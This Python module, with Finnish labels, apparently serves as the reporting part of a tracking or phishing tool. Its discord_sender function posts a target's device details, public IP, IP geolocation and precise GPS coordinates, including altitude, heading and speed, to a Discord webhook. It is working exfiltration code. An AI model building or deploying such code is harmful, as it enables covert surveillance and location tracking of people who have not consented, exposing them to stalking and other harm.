#!/usr/bin/env python3

import requests
from json import dumps, loads


def discord_sender(url, msg_type, content):
    json_str = dumps(content)
    json_content = loads(json_str)
    if msg_type == 'device_info':
        info_message = {
            "content": None,
            "embeds": [
                {
                    "title": "Laitteen tiedot",
                    "color": 65280,
                    "fields": [
                        {
                            "name": "Käyttöjärjestelmä",
                            "value": json_content['os']
                        },
                        {
                            "name": "Alusta",
                            "value": json_content['platform']
                        },
                        {
                            "name": "Selain",
                            "value": json_content['browser']
                        },
                        {
                            "name": "GPU-valmistaja",
                            "value": json_content['vendor']
                        },
                        {
                            "name": "GPU",
                            "value": json_content['render']
                        },
                        {
                            "name": "CPU-ytimiä",
                            "value": json_content['cores']
                        },
                        {
                            "name": "RAM",
                            "value": json_content['ram']
                        },
                        {
                            "name": "Julkinen IP",
                            "value": json_content['ip']
                        },
                        {
                            "name": "Resoluutio",
                            "value": f'{json_content["ht"]}x{json_content["wd"]}'
                        }
                    ]
                }
            ]
        }
        requests.post(url, json=info_message, timeout=10)

    if msg_type == 'ip_info':
        ip_info_msg = {
            "content": None,
            "embeds": [
                {
                    "title": "IP-tiedot",
                    "color": 65280,
                    "fields": [
                        {
                            "name": "Manner",
                            "value": json_content['continent']
                        },
                        {
                            "name": "Maa",
                            "value": json_content['country']
                        },
                        {
                            "name": "Alue",
                            "value": json_content['region']
                        },
                        {
                            "name": "Kaupunki",
                            "value": json_content['city']
                        },
                        {
                            "name": "Org",
                            "value": json_content['org']
                        },
                        {
                            "name": "ISP",
                            "value": json_content['isp']
                        }
                    ]
                }
            ]
        }
        requests.post(url, json=ip_info_msg, timeout=10)

    if msg_type == 'location':
        location_msg = {
            "content": None,
            "embeds": [
                {
                    "title": "Sijaintitiedot",
                    "color": 65280,
                    "fields": [
                        {
                            "name": "Leveysaste",
                            "value": json_content['lat']
                        },
                        {
                            "name": "Pituusaste",
                            "value": json_content['lon']
                        },
                        {
                            "name": "Tarkkuus",
                            "value": json_content['acc']
                        },
                        {
                            "name": "Korkeus",
                            "value": json_content['alt']
                        },
                        {
                            "name": "Suunta",
                            "value": json_content['dir']
                        },
                        {
                            "name": "Nopeus",
                            "value": json_content['spd']
                        }
                    ]
                }
            ]
        }
        requests.post(url, json=location_msg, timeout=10)

    if msg_type == 'url':
        url_msg = {
            "content": json_content['url'],
            "embeds": None,
            "attachments": []
        }
        requests.post(url, json=url_msg, timeout=10)

    if msg_type == 'error':
        error_msg = {
            "content": None,
            "embeds": [
                {
                    "color": 16711680,
                    "fields": [
                        {
                            "name": "Virhe",
                            "value": json_content['error']
                        }
                    ]
                }
            ],
            "attachments": []
        }
        requests.post(url, json=error_msg, timeout=10)
